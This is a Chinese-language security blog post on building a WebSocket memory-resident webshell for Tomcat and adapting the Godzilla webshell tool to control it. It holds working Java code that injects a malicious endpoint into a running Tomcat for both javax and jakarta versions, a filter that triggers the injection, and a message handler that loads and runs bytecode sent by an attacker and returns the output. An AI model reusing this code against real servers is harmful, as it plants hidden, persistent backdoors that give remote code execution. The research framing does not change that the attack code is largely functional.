@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="stoocea" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="time thicking away" />
+  
+  
+  
+  <title>
+    
+      WebSocket型内存马全版本构造探索及实战化利用 
+      
+      
+      |
+    
+     stoocea&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.jpeg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">stoocea</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">WebSocket型内存马全版本构造探索及实战化利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-05-28 20:39:51
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/WebSocket/" title="WebSocket">
+                    #WebSocket
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久都没有发文章了，其实在这段日子里写了很多文章，也做了很多调试，每次都是思考到最后或者做到最后的时候没有成色，导致文章也没有发出来。不过webscoket这个好歹能够收个尾，就发出来看看。</p>
+<p>这篇文章跨度很大，看我的idea背景也看得出来（x，其实在开头我提到的某个connector层的内存马就死在了这里，不能够实战化使用其实是比较蛋疼的地方。然后我看了一下veo师傅的原项目，居然已经提到了，并且其实思路上面已经差不多能对上了，但是真正实现起来我考虑了很多不需要考虑的问题，导致最终问题堆积起来就解决不了，还是基本功太薄弱了。</p>
+<h1 id="websocket前置"><a href="#websocket前置" class="headerlink" title="websocket前置"></a>websocket前置</h1><p>经过之前内存马的洗礼，其实不管是未知类型的探索还是对于已知类型的复现和学习，通性应该是了解为什么要探究这个类型，以及这个类型怎么使用，如何动态构造</p>
+<p>那首先就是我们为什么需要WebSocket型内存马</p>
+<p>由于其双端通信的特性，websocket并不局限于java这一种利用场景，现在大部分语言都支持了websocket协议的API。且websocket区别于http请求不同的点是在它的通信阶段，建立连接握手阶段还是通过http来的，因此兼容性很强，只不过后面的通信阶段采用的是纯TCP请求，默认端口也是80和443</p>
+<p>所以其实一段websocket请求发送过来的时候，前半段的处理还是走Http的逻辑，tomcat最终还是决定将Websocket请求的处理放在filterchain中。如果有师傅使用过一些内存马查杀工具在看filters时应该会注意到一个默认的WsFilter一直存在。且由于filter在tomcat判断当前请求路由是否为404异常的前面，所以这里不论是什么请求都会走一遍WsFilter的dofilter，只不过优先级是最后的</p>
+<p><img src="/images/websocket/assets/image-20250428173229-vq7uwn7.png" alt="image"></p>
+<p>可想而知这一个过程是tomcat在初始化的就进行了的，接下来看看一个正常业务中如何标准自建使用WebSocket处理逻辑，然后跟进这个filter进行调试</p>
+<p>在tomcat中有两种自建websocket的方式，一种是通过注解实现（tomcat启动时会自动进行对应的注解扫描），一种是通过继承<code>Endpoint</code>​类实现，不过要自己写serverConfig。</p>
+<p>通过注解写自定义ServerEndpoint之后，tomcat在创建container层的流程中会走到standardContext的startInternal方法，其中有一段关于Call ServletContainerInitializers的操作。这其实也是Servlet 3.0开始规范下的用来初始化servlet和listener的逻辑。而遍历到的WsSci全程叫做WebSocketServerInitializer，他的onstartUp方法中会对当前项目下打了<code>@ServerEndpoint</code>​注解的类进行一个注册和加载</p>
+<p><img src="/images/websocket/assets/image-20250429112430-t0kye2z.png" alt="image"></p>
+<p>这一段还会涉及到我们后面动态构造websocket，同时也可以稍微理解一下tomcat下的websocket创建和使用</p>
+<p>所以我们可以先采用注解实现，建立连接先调试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.test.WebSocketGood;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.security.ConcurrentMessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpoint;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/anno/chat&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebSocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">           ...........</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getWebSocketAccept</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] WS_ACCEPT = <span class="string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span>.getBytes(StandardCharsets.ISO_8859_1);</span><br><span class="line">        <span class="type">byte</span>[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(digest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后可以利用一些工具进行websocket连接，比如postman，点击send Message就能够发送文本消息，在OnMessage方法中打上断点就能够看到调用栈了</p>
+<p><img src="/images/websocket/assets/image-20250429101233-1gq6ads.png" alt="image"></p>
+<h1 id="动态添加自定义websocket探索"><a href="#动态添加自定义websocket探索" class="headerlink" title="动态添加自定义websocket探索"></a>动态添加自定义websocket探索</h1><p>‍</p>
+<h2 id="0x01-WsFilter判断处理"><a href="#0x01-WsFilter判断处理" class="headerlink" title="0x01 WsFilter判断处理"></a>0x01 WsFilter判断处理</h2><p>websocket初次建立链接的时候还是采用的http握手的方式，而一开始的建立握手的基础就是WSFilter的逻辑能够正常走，其中我们会遇到很多if判断和从内存取值的操作来判断我们当前的请求是否是websocket请求，以及当前是否有自定义serverEndpoint进行了注册</p>
+<p>一开始进入WSFilter就遇到了一段if判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!sc.areEndpointsRegistered() || !UpgradeUtil.isWebSocketUpgradeRequest(request, response)) &#123;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果说我们没有注册自定义serverendpoint的话，或运算前半段就直接满足条件进入if逻辑按正常的http请求过了</p>
+<p>所以这里sc属性（WsServerContainer）的areEndpintsRegistered就必须返回true，也就是有serverendponint的注册</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">areEndpointsRegistered</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> endpointsRegistered;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<code>WsServerContainer</code>​唯一给endpointsRegistered赋值为true的地方在<code> void addEndpoint(ServerEndpointConfig sec, boolean fromAnnotatedPojo)</code>​方法中，可以看到其有一个封装方法只需要传入指定的ServerEndpointConfig对象就能够完成整个自定义ServerEndpoint的操作</p>
+<p><img src="/images/websocket/assets/image-20250429104055-q37vv3p.png" alt="image"></p>
+<h3 id="构造ServerEndpointConfig"><a href="#构造ServerEndpointConfig" class="headerlink" title="构造ServerEndpointConfig"></a>构造ServerEndpointConfig</h3><p>所以现在问题初步落到ServerEndpointConfig对象如何构造上，构造好之后直接通过反射调用addEndpoint进行参数传递进去即可，观察其结构</p>
+<p><img src="/images/websocket/assets/image-20250429105144-8l3aup4.png" alt="image"></p>
+<p>本身是一个接口，所以最终构造还是落实在其实现类上。这里可以看到他有一个子类Builder，按理来说就是用来构造具体的ServerEndpointConfig的，他的build方法也的确如此</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ServerEndpointConfig <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultServerEndpointConfig</span>(<span class="built_in">this</span>.endpointClass, <span class="built_in">this</span>.path, <span class="built_in">this</span>.subprotocols, <span class="built_in">this</span>.extensions, <span class="built_in">this</span>.encoders, <span class="built_in">this</span>.decoders, <span class="built_in">this</span>.configurator);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以现在的思路就是通过反射获取到ServerEndpointConfig接口的子类Builder，然后反射调用其build方法获得一个DefaultServerEndpointConfig。然后调用WsServerContainer的addEndpoint方法</p>
+<p>‍</p>
+<h3 id="动态获取WsServerContainer"><a href="#动态获取WsServerContainer" class="headerlink" title="动态获取WsServerContainer"></a>动态获取WsServerContainer</h3><p>WsServerContainer就是喜闻乐见的全版本构造获取的关键，如何动态的获取当前运行状态下的WsServerContainer呢？</p>
+<p>这里可以在WsServerContainer的构造方法打个断点，然后观察tomcat初始化的过程，我们最开始的探索websocket创建的时候其实已经稍微摸到边了，在WsSci调用onstartUp方法注册servlet和listener的时候，第一段就是init方法对WsServerContainer进行创建，并且将其set进了servletContext</p>
+<p><img src="/images/websocket/assets/image-20250429114152-kjtzg0q.png" alt="image"></p>
+<p>最终setAttribute是设置进了ApplicationContext的attributes属性值。这里取值带有很明显的tomcat版本特征，且键名已经被标记上了@Deprecated，之后版本肯定要换一个构造</p>
+<p><img src="/images/websocket/assets/image-20250429140922-4372bae.png" alt="image"></p>
+<p>所以这里只需要通过standardContext获取到ApplicationContext即可，而standardContext的getServletContext()方法能够直接获取到当前Container中的ApplicationContext</p>
+<p>具体构造如下,省略了遍历线程获取standardContext的步骤以及通过传入Evil字节码构建恶意Endpoint的步骤，避免内容冗余，最核心的一段内容如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEndPoint</span><span class="params">(Object context,Object Endpoint)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ApplicationContextFaced</span> <span class="operator">=</span> invokeMethod(context, <span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            Object ApplicationContext=getFV(ApplicationContextFaced,<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">atrributes</span> <span class="operator">=</span> getFV(ApplicationContext, <span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">            <span class="comment">//tomcat10以下获取思路</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">WsServerContainer</span> <span class="operator">=</span> invokeMethod(atrributes, <span class="string">&quot;get&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span>&#125;);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">ServerEndpointConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">BuilderClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.websocket.server.ServerEndpointConfig$Builder&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getBuilder</span> <span class="operator">=</span> BuilderClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,String.class&#125;);</span><br><span class="line">            getBuilder.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Builder</span> <span class="operator">=</span> getBuilder.invoke(<span class="literal">null</span>, Endpoint.getClass(), <span class="string">&quot;/pathtest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">normalEndpointConfig</span> <span class="operator">=</span> invokeMethod(Builder, <span class="string">&quot;build&quot;</span>);</span><br><span class="line">            invokeMethod(WsServerContainer, <span class="string">&quot;addEndpoint&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServerEndpointConfigClass&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;normalEndpointConfig&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>getFV和invokeMethod分别是反射获取（会遍历父类）对象以及反射调用方法。最后的poc我会放在github中，然后是javax改包之后的poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEndPoint</span><span class="params">(Object context,Object Endpoint)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ApplicationContextFaced</span> <span class="operator">=</span> invokeMethod(context, <span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            Object ApplicationContext=getFV(ApplicationContextFaced,<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">atrributes</span> <span class="operator">=</span> getFV(ApplicationContext, <span class="string">&quot;attributes&quot;</span>);</span><br><span class="line">            <span class="comment">//tomcat10以上获取思路</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">WsServerContainer</span> <span class="operator">=</span> invokeMethod(atrributes, <span class="string">&quot;get&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;jakarta.websocket.server.ServerContainer&quot;</span>&#125;);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">ServerEndpointConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;jakarta.websocket.server.ServerEndpointConfig&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">BuilderClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;jakarta.websocket.server.ServerEndpointConfig$Builder&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getBuilder</span> <span class="operator">=</span> BuilderClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,String.class&#125;);</span><br><span class="line">            getBuilder.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Builder</span> <span class="operator">=</span> getBuilder.invoke(<span class="literal">null</span>, Endpoint.getClass(), <span class="string">&quot;/pathtest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">normalEndpointConfig</span> <span class="operator">=</span> invokeMethod(Builder, <span class="string">&quot;build&quot;</span>);</span><br><span class="line">            invokeMethod(WsServerContainer, <span class="string">&quot;addEndpoint&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServerEndpointConfigClass&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;normalEndpointConfig&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里修改完之后就可以开始测试，我们可以先封装一个测试类，为了方便，我这里就直接写一个filter里面用来触发实时的注入逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;gooddofilter&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           List&lt;Object&gt; contexts = getContext();</span><br><span class="line">           <span class="keyword">for</span> (Object context : contexts) &#123;</span><br><span class="line">               <span class="type">Object</span> <span class="variable">filter</span> <span class="operator">=</span> getEndpoint(context);</span><br><span class="line">               addEndPoint(context, filter);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>get去触发一下对应的filter路由，然后连接ws后之后发送命令即可</p>
+<h1 id="多功能shell实现"><a href="#多功能shell实现" class="headerlink" title="多功能shell实现"></a>多功能shell实现</h1><p>现在网上应该找不到能够跑的websocket样本，不过听说某些实验室肯定已经用了很久了，为了保险起见我也不会发出来所有的改造思路，效果图如下，为了能够快速的举一反三，这里我先还用的是godzilla的二开，因为熟悉一点，不用从头看逻辑。</p>
+<p><img src="/images/websocket/assets/ff4a26c4de13d63e810167af78ff6287-20250528140131-kqjz3d2.png" alt="ff4a26c4de13d63e810167af78ff6287"></p>
+<p>首先明确思路，我们不论是godzilla，还是shell本身都应该去做对应的修改。</p>
+<p>先看shell本身</p>
+<h2 id="Websocketmemshell改造"><a href="#Websocketmemshell改造" class="headerlink" title="Websocketmemshell改造"></a>Websocketmemshell改造</h2><p>java这块的godzilla的shell功能实现是通过加载恶意类之后进行各种方法反射调用实现的。流程整体是先初始化，传输过来一份巨大的payload字节码，然后交给shell进行类加载，之后存入缓存session。后续再调用test功能探测shell存活，由于刚才已经缓存过payload字节码了，这里检测到session中有缓存，于是直接取出，进行字节码加载，然后调用其基础测试功能方法，通过返回值来判断是否存活。</p>
+<p>实现逻辑如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(ByteBuffer bytebuffer)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] data=base64Decode(bytebuffer.array());</span><br><span class="line">            data=x(data, <span class="literal">false</span>);</span><br><span class="line">            Session session=<span class="built_in">this</span>.sessionSource;</span><br><span class="line">            <span class="keyword">if</span> (session.getUserProperties().get(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                session.getUserProperties().put(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">JavaXEvilWebSocket</span>().Q(data));</span><br><span class="line">                session.getBasicRemote().sendObject(x(<span class="string">&quot;ok&quot;</span>.getBytes(), <span class="literal">true</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object f;</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                   session.getUserProperties().put(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">					<span class="comment">//f通过最开始缓存中的字节码加载过后的Class取出</span></span><br><span class="line">                   f = ((Class) session.getUserProperties().get(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">			</span><br><span class="line">                f.equals(arrOut);</span><br><span class="line">				<span class="comment">//由于websocket没有直接获得ServletRequest的方法（间接有，但是过于麻烦导致代码冗余，不如直接通过session作为param的载体）</span></span><br><span class="line">                f.equals(session);</span><br><span class="line">                f.equals(data);</span><br><span class="line">                f.toString();</span><br><span class="line">                <span class="comment">//System.out.println(java.util.Base64.getEncoder().encodeToString(arrOut.toByteArray()));</span></span><br><span class="line">				<span class="comment">//websocket中调用多次session.getBasicRemote().sendObject就真的是发多次消息，而不是拼接发送，所以这里我们要利用一个ByteArray进行凭拼接，然后整体把ByteArray传出去</span></span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                buffer.write(md5.substring(<span class="number">0</span>,<span class="number">16</span>).getBytes());</span><br><span class="line">                buffer.write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)).getBytes());</span><br><span class="line">                buffer.write(md5.substring(<span class="number">16</span>).getBytes());</span><br><span class="line">                System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(buffer.toByteArray()));</span><br><span class="line">                session.getBasicRemote().sendObject(buffer.toByteArray());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在onOpen处我这边设置了接受的数据长度和session的缓存。因为初始化传过来的payload实在是太大了，所以这里有必要写个最大接受数量。</p>
+<p><img src="/images/websocket/assets/image-20250528154841-92584uj.png" alt="image"></p>
+<p>shell实际可以说的都在注释里面了，相较于纯http组件有Request这种比较方便的参数载体有所不同。但websocket本质还是http建立连接，然后tcp双端通信，所以我们还是可以获取到http的一些参数的，只不过后续的参数传递不是http的传递，而是纯字节流，所以类似于Request对象的这种传参键值对，我们只能够在获取之后将其存入WSsession的usersProperties中，这一点在后续的godzilla改造中也有所体现。</p>
+<p>‍</p>
+<h2 id="Godzilla改造"><a href="#Godzilla改造" class="headerlink" title="Godzilla改造"></a>Godzilla改造</h2><p>这里记得引入websocket-client依赖，用以通信</p>
+<h3 id="webSocket-Cryption新增"><a href="#webSocket-Cryption新增" class="headerlink" title="webSocket-Cryption新增"></a>webSocket-Cryption新增</h3><p>我二开的思路就是能够新增分装功能就新增，而不是在原有的基础上改逻辑。不过有的时候不得不改，最多用ifelse这种判断走不同情况。</p>
+<p>类似于javaAESbase64，websocket我们也可以封装一个功能类。</p>
